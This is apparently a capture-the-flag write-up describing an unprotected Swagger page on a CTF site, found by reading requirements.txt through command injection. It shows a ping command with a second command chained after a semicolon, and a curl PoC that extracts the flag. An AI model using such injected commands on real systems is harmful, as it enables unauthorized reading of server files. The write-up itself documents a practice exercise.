# Vulnerability

swagger endpoint enabled but not protected, so the user can use the swagger without any protection.

# Extraction

I found out that the project must have a swagger page considering this requirement `drf-spectacular[sidecar]>=0.28` in `requirements.txt` which I found it using RCE :

```
$ ping -c 2 google.com; cat requirements.txt
Django>=5.2,<6.0
PyJWT>=2.8
requests>=2.31
gunicorn>=21.2
whitenoise>=6.6
djangorestframework>=3.15
drf-spectacular[sidecar]>=0.28
```

So I opened the swagger page in this link `https://ctf.seoeh.ir/api/schema/swagger-ui/` and a flag was in the header of swagger page. 

# PoC

```
curl -s https://ctf.seoeh.ir/api/schema/ | grep -o 'HAMAMOOZ{[^}]*}'
```